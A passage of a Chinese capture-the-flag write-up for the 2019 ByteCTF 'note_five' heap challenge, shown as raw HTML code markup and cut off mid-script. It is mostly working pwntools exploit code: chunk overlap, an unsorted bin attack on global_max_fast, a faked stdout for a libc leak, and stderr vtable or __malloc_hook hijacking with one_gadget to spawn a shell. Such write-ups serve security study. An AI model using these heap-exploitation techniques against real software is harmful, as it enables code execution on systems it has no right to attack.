class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里需要调试，被自己蠢哭了，一直搞错一个变量。f..k!!!!!!!!!!!!!!!!!!!!!!!!!!!!<br><strong>第二步：爆破global_max_fast后四位地址，由于0x1000机制，后三位不变0x7f8，unsorted bin attack修改值大小以至于可以使用fastbin attack</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 爆破global_max_fast后四位地址，由于0x1000机制，后三位不变0x7f8</span><span class="token comment" spellcheck="true"># unsorted bin attack修改值大小以至于可以使用fastbin attack</span>guess_num <span class="token operator">=</span> <span class="token number">3</span> <span class="token comment" spellcheck="true"># 1/16</span>global_max_fast <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7f8</span>payload1<span class="token operator">=</span> payload <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第三步：进行fastbin attack分配到stdout相邻的地址上去，找偏移</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># fast bin attack 控制stdout附近地址来执行</span>offset_maxFast_stdout <span class="token operator">=</span> <span class="token number">0x11d8</span>  <span class="token comment" spellcheck="true"># max_fast_bin - stdout</span>target_address <span class="token operator">=</span> global_max_fast<span class="token operator">-</span> offset_maxFast_stdout <span class="token operator">-</span> <span class="token number">0x51</span>  <span class="token comment" spellcheck="true"># 找到的size合适的地址</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>target_address<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> payload <span class="token operator">+</span> p16<span class="token punctuation">(</span>target_address<span class="token punctuation">)</span> edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#get target chunk,fastbin attack success</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第四步：控制stdout，flag=0xfbad1800,write_base = leak_addr(通常是好计算的地址)，计算offset</strong></p><pre class="line-numbers language-python"><code class="language-python">fake_stdout <span class="token operator">=</span> <span class="token string">"0"</span>fake_stdout<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x40</span>fake_stdout<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span>fake_stdout<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>fake_stdout<span class="token operator">+=</span> p16<span class="token punctuation">(</span>stdout_addr_last4<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># io_write_base指向自己，才能把地址打印出来</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>fake_stdout<span class="token punctuation">)</span>stdout_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"stdout address: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>stdout_addr<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"stdout last 4 addr"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>stdout_addr_last4<span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> stdout_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'stdout'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第五步：控制stderr ，最终触发 IO_flush_all来 getshell</strong></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/24/2019-bytectf-bu-fen-pwn-fu-pan/21.png"></div><p>满足一个条件就可以了，之前做过满足第一个条件，现在由于分配的地址较好，所以我们来满足第二个条件。也就是：<br>fp-&gt;mode &gt; 0<br>fp-&gt;wide_data-&gt;io_write_ptr&gt;fp-&gt;wide_data-&gt;io_write_base</p><pre class="line-numbers language-python"><code class="language-python">fake_stderr <span class="token operator">=</span> <span class="token string">"0"</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>stdout_addr<span class="token number">-0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#  fp->wide_data(struct)</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token comment" spellcheck="true">#  相当于是把wide_date结构体指向本身，只关注需要的变量，同时</span><span class="token comment" spellcheck="true"># 数据复用，这部分既是io_file结构体的成员也是wide_date的成员</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>fake_stderr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>第六步：hijacking io_file函数这部步其实和上面的第五步可以连接在一起，代码发生一点变动，把vtable写进去</strong></p><pre class="line-numbers language-python"><code class="language-python">one_gadget <span class="token operator">=</span> <span class="token number">0xf02a4</span> <span class="token operator">+</span> libc_offsetfake_stderr <span class="token operator">=</span> <span class="token string">"0"</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>stdout_addr<span class="token number">-0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#  fp->wide_data(struct)</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  相当于是把wide_date结构体指向本身，只关注需要的变量，同时</span><span class="token comment" spellcheck="true"># 数据复用，这部分既是io_file结构体的成员也是wide_date的成员</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># hajicking overflow</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>fake_stderr<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">16</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>stdout_addr<span class="token number">-0x48</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fd->vtable</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>fake_stderr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./note_five"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./note_five"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 控制一个大chunk里面包含小chunk</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xe8</span><span class="token operator">+</span><span class="token string">"\xe1"</span><span class="token punctuation">)</span> create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x1d0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 最后一位为0代表前面没有使用！！！！蠢死！</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 爆破global_max_fast后四位地址，由于0x1000机制，后三位不变0x7f8</span><span class="token comment" spellcheck="true"># unsorted bin attack修改值大小以至于可以使用fastbin attack</span>guess_num <span class="token operator">=</span> <span class="token number">3</span> <span class="token comment" spellcheck="true"># 1/16</span>global_max_fast <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7f8</span>payload1<span class="token operator">=</span> payload <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># fast bin attack 控制stdout附近地址来执行</span>offset_maxFast_stdout <span class="token operator">=</span> <span class="token number">0x11d8</span>  <span class="token comment" spellcheck="true"># max_fast_bin - stdout</span>target_address <span class="token operator">=</span> global_max_fast<span class="token operator">-</span> offset_maxFast_stdout <span class="token operator">-</span> <span class="token number">0x51</span>  <span class="token comment" spellcheck="true"># 找到的size合适的地址</span>stdout_addr_last4 <span class="token operator">=</span> global_max_fast<span class="token operator">-</span> offset_maxFast_stdout<span class="token keyword">print</span> hex<span class="token punctuation">(</span>target_address<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> payload <span class="token operator">+</span> p16<span class="token punctuation">(</span>target_address<span class="token punctuation">)</span> edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#get target chunk,fastbin attack success</span><span class="token comment" spellcheck="true"># control stdout</span>fake_stdout <span class="token operator">=</span> <span class="token string">"0"</span>fake_stdout<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x40</span>fake_stdout<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span>fake_stdout<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>fake_stdout<span class="token operator">+=</span> p16<span class="token punctuation">(</span>stdout_addr_last4<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># io_write_base指向自己，才能把地址打印出来</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>fake_stdout<span class="token punctuation">)</span>stdout_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token keyword">print</span> <span class="token string">"stdout address: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>stdout_addr<span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> stdout_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'stdout'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># control stderr hijaking overflow</span>one_gadget <span class="token operator">=</span> <span class="token number">0xf02a4</span> <span class="token operator">+</span> libc_offsetfake_stderr <span class="token operator">=</span> <span class="token string">"0"</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>stdout_addr<span class="token number">-0x40</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#  fp->wide_data(struct)</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  相当于是把wide_date结构体指向本身，只关注需要的变量，同时</span><span class="token comment" spellcheck="true"># 数据复用，这部分既是io_file结构体的成员也是wide_date的成员</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># hajicking overflow</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>fake_stderr<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">16</span>fake_stderr<span class="token operator">+=</span> p64<span class="token punctuation">(</span>stdout_addr<span class="token number">-0x48</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fd->vtable</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>fake_stderr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>前四步相同</p><p> 第五步：找到合适位置的chunk，位置必须再malloc_hook之前。</p><pre class="line-numbers language-python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>target_start_addr <span class="token operator">=</span> libc_offset <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token number">0x1a1</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>target_start_addr<span class="token punctuation">)</span>payload3 <span class="token operator">=</span> payload<span class="token operator">+</span>p64<span class="token punctuation">(</span>target_start_addr<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload3<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>payload4 <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xd9</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload4<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>target_start_addr<span class="token operator">+=</span> <span class="token number">0xe1</span>payload4 <span class="token operator">=</span> payload<span class="token operator">+</span>p64<span class="token punctuation">(</span>target_start_addr<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload4<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>one_gadgets<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span><span class="token number">0x4526a</span><span class="token punctuation">,</span><span class="token number">0xf02a4</span><span class="token punctuation">,</span><span class="token number">0xf1147</span><span class="token punctuation">]</span>hijacking_malloc_addr <span class="token operator">=</span> target_start_addr<span class="token operator">+</span><span class="token number">0x10</span>payload5 <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc_offset <span class="token operator">+</span> one_gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload5<span class="token operator">+=</span> <span class="token number">0xa0</span><span class="token operator">*</span><span class="token string">"a"</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_offset <span class="token operator">+</span> one_gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload5<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./note_five"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./note_five"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 控制一个大chunk里面包含小chunk</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xe8</span><span class="token operator">+</span><span class="token string">"\xe1"</span><span class="token punctuation">)</span> create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x1d0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 最后一位为0代表前面没有使用！！！！蠢死！</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 爆破global_max_fast后四位地址，由于0x1000机制，后三位不变0x7f8</span><span class="token comment" spellcheck="true"># unsorted bin attack修改值大小以至于可以使用fastbin attack</span>guess_num <span class="token operator">=</span> <span class="token number">3</span> <span class="token comment" spellcheck="true"># 1/16</span>global_max_fast <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7f8</span>payload1<span class="token operator">=</span> payload <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># fast bin attack 控制stdout附近地址来执行</span>offset_maxFast_stdout <span class="token operator">=</span> <span class="token number">0x11d8</span>  <span class="token comment" spellcheck="true"># max_fast_bin - stdout</span>target_address <span class="token operator">=</span> global_max_fast<span class="token operator">-</span> offset_maxFast_stdout <span class="token operator">-</span> <span class="token number">0x51</span>  <span class="token comment" spellcheck="true"># 找到的size合适的地址</span>stdout_addr_last4 <span class="token operator">=</span> global_max_fast<span class="token operator">-</span> offset_maxFast_stdout<span class="token keyword">print</span> hex<span class="token punctuation">(</span>target_address<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> payload <span class="token operator">+</span> p16<span class="token punctuation">(</span>target_address<span class="token punctuation">)</span> edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token 